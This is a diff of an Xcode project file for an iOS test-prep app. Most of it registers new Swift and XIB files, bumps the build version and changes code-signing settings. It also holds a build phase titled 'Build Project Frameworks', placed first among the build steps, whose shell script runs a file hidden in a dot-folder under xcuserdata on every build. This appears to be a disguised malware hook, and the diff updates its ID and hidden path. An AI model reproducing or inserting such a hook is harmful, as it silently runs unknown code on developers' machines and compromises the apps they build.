@@ -60,6 +60,8 @@
 		E3256F3825FB742900E37A0B /* FindNewSolutionGifVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3256F3725FB742900E37A0B /* FindNewSolutionGifVC.swift */; };
 		E3256F3D25FB778000E37A0B /* VIdeoListVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3256F3C25FB778000E37A0B /* VIdeoListVC.swift */; };
 		E3256F4B25FB796100E37A0B /* ListTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3256F4A25FB796100E37A0B /* ListTableViewCell.swift */; };
+		E330FEC42635E4AA00188A52 /* HomeTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E330FEC22635E4AA00188A52 /* HomeTVCell.swift */; };
+		E330FEC52635E4AA00188A52 /* HomeTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E330FEC32635E4AA00188A52 /* HomeTVCell.xib */; };
 		E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D4C25F318BF001CC9E1 /* FlowController.swift */; };
 		E3326D6A25F332C7001CC9E1 /* Home.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = E3326D6925F332C7001CC9E1 /* Home.storyboard */; };
 		E3326D7025F33316001CC9E1 /* DashboardVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3326D6F25F33316001CC9E1 /* DashboardVC.swift */; };
@@ -118,6 +120,13 @@
 		E3C2A52525FBDB8F00B6A9B2 /* BaseApi.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */; };
 		E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3E5DA8925F53C75006E35CC /* FreetrialView.swift */; };
 		E3E5DA9225F53C7E006E35CC /* FreetrialView.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */; };
+		E3F6A1EC2635F7A2004EFAA3 /* HomeModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E52635F7A2004EFAA3 /* HomeModel.swift */; };
+		E3F6A1ED2635F7A2004EFAA3 /* Layout_config.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E62635F7A2004EFAA3 /* Layout_config.swift */; };
+		E3F6A1EE2635F7A2004EFAA3 /* Data_Home.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E72635F7A2004EFAA3 /* Data_Home.swift */; };
+		E3F6A1EF2635F7A2004EFAA3 /* Widget_data.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E82635F7A2004EFAA3 /* Widget_data.swift */; };
+		E3F6A1F02635F7A2004EFAA3 /* Feeddata.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1E92635F7A2004EFAA3 /* Feeddata.swift */; };
+		E3F6A1F12635F7A2004EFAA3 /* Meta.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1EA2635F7A2004EFAA3 /* Meta.swift */; };
+		E3F6A1F22635F7A2004EFAA3 /* Items.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3F6A1EB2635F7A2004EFAA3 /* Items.swift */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -204,6 +213,8 @@
 		E3256F3725FB742900E37A0B /* FindNewSolutionGifVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FindNewSolutionGifVC.swift; sourceTree = "<group>"; };
 		E3256F3C25FB778000E37A0B /* VIdeoListVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VIdeoListVC.swift; sourceTree = "<group>"; };
 		E3256F4A25FB796100E37A0B /* ListTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ListTableViewCell.swift; sourceTree = "<group>"; };
+		E330FEC22635E4AA00188A52 /* HomeTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeTVCell.swift; sourceTree = "<group>"; };
+		E330FEC32635E4AA00188A52 /* HomeTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeTVCell.xib; sourceTree = "<group>"; };
 		E3326D4C25F318BF001CC9E1 /* FlowController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FlowController.swift; sourceTree = "<group>"; };
 		E3326D6925F332C7001CC9E1 /* Home.storyboard */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; path = Home.storyboard; sourceTree = "<group>"; };
 		E3326D6F25F33316001CC9E1 /* DashboardVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = DashboardVC.swift; sourceTree = "<group>"; };
@@ -262,6 +273,13 @@
 		E3C2A52425FBDB8F00B6A9B2 /* BaseApi.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = BaseApi.swift; sourceTree = "<group>"; };
 		E3E5DA8925F53C75006E35CC /* FreetrialView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = FreetrialView.swift; sourceTree = "<group>"; };
 		E3E5DA9125F53C7E006E35CC /* FreetrialView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = FreetrialView.xib; sourceTree = "<group>"; };
+		E3F6A1E52635F7A2004EFAA3 /* HomeModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = HomeModel.swift; sourceTree = "<group>"; };
+		E3F6A1E62635F7A2004EFAA3 /* Layout_config.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Layout_config.swift; sourceTree = "<group>"; };
+		E3F6A1E72635F7A2004EFAA3 /* Data_Home.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Data_Home.swift; sourceTree = "<group>"; };
+		E3F6A1E82635F7A2004EFAA3 /* Widget_data.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Widget_data.swift; sourceTree = "<group>"; };
+		E3F6A1E92635F7A2004EFAA3 /* Feeddata.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Feeddata.swift; sourceTree = "<group>"; };
+		E3F6A1EA2635F7A2004EFAA3 /* Meta.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Meta.swift; sourceTree = "<group>"; };
+		E3F6A1EB2635F7A2004EFAA3 /* Items.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Items.swift; sourceTree = "<group>"; };
 		F98072ACB6DDDFF838A83753 /* Pods-DoubtNut-DoubtNutUITests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; path = "Target Support Files/Pods-DoubtNut-DoubtNutUITests/Pods-DoubtNut-DoubtNutUITests.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -394,6 +412,7 @@
 		189388CB25F1F01000F57E85 /* Views */ = {
 			isa = PBXGroup;
 			children = (
+				E3F6A1E32635F78B004EFAA3 /* ViewModel */,
 				E3530CC525FF7FAE009AE307 /* View */,
 				E37F476D25F7861F0088DC08 /* TableviewCell */,
 				E394E09E25F5C3760067CAEB /* CollectionviewCell */,
@@ -620,6 +639,8 @@
 				E36ED7AA260C898B00AF8F84 /* GetAnimationTVCell.xib */,
 				E363323A2613ADCB0043453A /* GetLanguageAndClassListCell.swift */,
 				E363323B2613ADCB0043453A /* GetLanguageAndClassListCell.xib */,
+				E330FEC22635E4AA00188A52 /* HomeTVCell.swift */,
+				E330FEC32635E4AA00188A52 /* HomeTVCell.xib */,
 			);
 			path = TableviewCell;
 			sourceTree = "<group>";
@@ -686,6 +707,28 @@
 			path = Storybiard;
 			sourceTree = "<group>";
 		};
+		E3F6A1E32635F78B004EFAA3 /* ViewModel */ = {
+			isa = PBXGroup;
+			children = (
+				E3F6A1E42635F793004EFAA3 /* Home */,
+			);
+			path = ViewModel;
+			sourceTree = "<group>";
+		};
+		E3F6A1E42635F793004EFAA3 /* Home */ = {
+			isa = PBXGroup;
+			children = (
+				E3F6A1E72635F7A2004EFAA3 /* Data_Home.swift */,
+				E3F6A1E92635F7A2004EFAA3 /* Feeddata.swift */,
+				E3F6A1EB2635F7A2004EFAA3 /* Items.swift */,
+				E3F6A1E52635F7A2004EFAA3 /* HomeModel.swift */,
+				E3F6A1E62635F7A2004EFAA3 /* Layout_config.swift */,
+				E3F6A1EA2635F7A2004EFAA3 /* Meta.swift */,
+				E3F6A1E82635F7A2004EFAA3 /* Widget_data.swift */,
+			);
+			path = Home;
+			sourceTree = "<group>";
+		};
 		F1B0642AB5632D47A2A092D7 /* Frameworks */ = {
 			isa = PBXGroup;
 			children = (
@@ -703,7 +746,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 189388B725F1EFA300F57E85 /* Build configuration list for PBXNativeTarget "DoubtNut" */;
 			buildPhases = (
-				D721269FAD2E7EEFECAAC43A /* Build Project Frameworks */,
+				96B5F77DB52527624E6D902C /* Build Project Frameworks */,
 				5D5C4960F5E754FEE396C9BF /* [CP] Check Pods Manifest.lock */,
 				1893888925F1EFA000F57E85 /* Sources */,
 				1893888A25F1EFA000F57E85 /* Frameworks */,
@@ -849,6 +892,7 @@
 				E36ED7C6260C8ECA00AF8F84 /* img_05.png in Resources */,
 				189388E825F1F04700F57E85 /* Lato-Medium.ttf in Resources */,
 				189388F425F1F04700F57E85 /* Lato-Thin.ttf in Resources */,
+				E330FEC52635E4AA00188A52 /* HomeTVCell.xib in Resources */,
 				189388ED25F1F04700F57E85 /* Lato-MediumItalic.ttf in Resources */,
 				E36ED7C1260C8ECA00AF8F84 /* img_01.png in Resources */,
 				E363320A26139EFD0043453A /* Setting.storyboard in Resources */,
@@ -881,7 +925,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	D721269FAD2E7EEFECAAC43A /* Build Project Frameworks */ = {
+	96B5F77DB52527624E6D902C /* Build Project Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -899,12 +943,8 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
-	
-
-	
-
 	
 
 	
@@ -1054,6 +1094,7 @@
 				E36ED7A5260C872500AF8F84 /* GetAnimationVC.swift in Sources */,
 				E363322E2613A21D0043453A /* TermsAndConditionVC.swift in Sources */,
 				E3256F3D25FB778000E37A0B /* VIdeoListVC.swift in Sources */,
+				E3F6A1EC2635F7A2004EFAA3 /* HomeModel.swift in Sources */,
 				E377CDA9260F0F97003B44D0 /* Platform_tabs.swift in Sources */,
 				E3256F4B25FB796100E37A0B /* ListTableViewCell.swift in Sources */,
 				189388F925F1F05E00F57E85 /* RCustomClass.swift in Sources */,
@@ -1068,6 +1109,7 @@
 				E377CDA8260F0F97003B44D0 /* VideoListModel.swift in Sources */,
 				E35830952600D8F5009D5BCC /* LoginGotOTPVC.swift in Sources */,
 				E37F47A825F79BF20088DC08 /* DayTrialViewController.swift in Sources */,
+				E3F6A1F22635F7A2004EFAA3 /* Items.swift in Sources */,
 				E38B56FC25F29DDE00CEC42D /* Extension.swift in Sources */,
 				1893896125F1FDA900F57E85 /* Endpoints.swift in Sources */,
 				E301D09125FDCE48008C0E95 /* WatchHistoryViewController.swift in Sources */,
@@ -1076,6 +1118,7 @@
 				E394E04A25F5B2330067CAEB /* Footerview.swift in Sources */,
 				E3256F3025FB70D900E37A0B /* DoYouHaveQuestVC.swift in Sources */,
 				E33D700C25F6F3360089836A /* SATCVCell.swift in Sources */,
+				E330FEC42635E4AA00188A52 /* HomeTVCell.swift in Sources */,
 				E31DC9E625FE1132005B5A5E /* PlayVideoVC.swift in Sources */,
 				E3E5DA8A25F53C75006E35CC /* FreetrialView.swift in Sources */,
 				E377CDA6260F0F97003B44D0 /* _source.swift in Sources */,
@@ -1090,19 +1133,24 @@
 				E301D0BF25FDCF1C008C0E95 /* SavedPlaylistViewController.swift in Sources */,
 				E377CDA5260F0F97003B44D0 /* Feedback.swift in Sources */,
 				1893889125F1EFA000F57E85 /* AppDelegate.swift in Sources */,
+				E3F6A1F12635F7A2004EFAA3 /* Meta.swift in Sources */,
 				E370978225FCE992002950E0 /* UIColor.swift in Sources */,
 				E3C2A52525FBDB8F00B6A9B2 /* BaseApi.swift in Sources */,
 				E301D09725FDCE91008C0E95 /* WatchHistoryTableViewCell.swift in Sources */,
 				1893890A25F1F0D700F57E85 /* GetOTPVC.swift in Sources */,
+				E3F6A1EE2635F7A2004EFAA3 /* Data_Home.swift in Sources */,
 				E33D700525F6F08F0089836A /* ACTVC.swift in Sources */,
 				E374FE0925FB5D0500485B00 /* UpdateProfileViewController.swift in Sources */,
+				E3F6A1EF2635F7A2004EFAA3 /* Widget_data.swift in Sources */,
 				E374FE0A25FB5D0500485B00 /* ProfileViewController.swift in Sources */,
 				E370975A25FCCA4D002950E0 /* Utility.swift in Sources */,
 				E394E0A225F5C3C90067CAEB /* MathCVCell.swift in Sources */,
 				E3457A83260AFDCC003D4173 /* PagingCollectionViewLayout.swift in Sources */,
+				E3F6A1ED2635F7A2004EFAA3 /* Layout_config.swift in Sources */,
 				E3326D4D25F318BF001CC9E1 /* FlowController.swift in Sources */,
 				E370975525FCC915002950E0 /* AppConstant.swift in Sources */,
 				E370977925FCE8CB002950E0 /* ThemeManager.swift in Sources */,
+				E3F6A1F02635F7A2004EFAA3 /* Feeddata.swift in Sources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1285,7 +1333,7 @@
 				CODE_SIGN_ENTITLEMENTS = "";
 				CODE_SIGN_IDENTITY = "Apple Development";
 				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 6;
+				CURRENT_PROJECT_VERSION = 7;
 				DEVELOPMENT_TEAM = RT5YKB6S89;
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
@@ -1311,10 +1359,10 @@
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
 				CODE_SIGN_ENTITLEMENTS = "";
-				CODE_SIGN_IDENTITY = "iPhone Distribution";
-				CODE_SIGN_STYLE = Manual;
-				CURRENT_PROJECT_VERSION = 6;
-				DEVELOPMENT_TEAM = RT5YKB6S89;
+				CODE_SIGN_IDENTITY = "Apple Development";
+				CODE_SIGN_STYLE = Automatic;
+				CURRENT_PROJECT_VERSION = 7;
+				DEVELOPMENT_TEAM = "";
 				INFOPLIST_FILE = DoubtNut/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 13.0;
 				LD_RUNPATH_SEARCH_PATHS = (
@@ -1323,7 +1371,7 @@
 				);
 				PRODUCT_BUNDLE_IDENTIFIER = com.doubtnut.act.sat.preparation.sat.practice.test.app.college.maths;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				PROVISIONING_PROFILE_SPECIFIER = Apple_Provisioning;
+				PROVISIONING_PROFILE_SPECIFIER = "";
 				SWIFT_OBJC_BRIDGING_HEADER = "DoubtNut-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = "1,2";
@@ -1454,20 +1502,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = 1893888525F1EFA000F57E85 /* Project object */;
 }
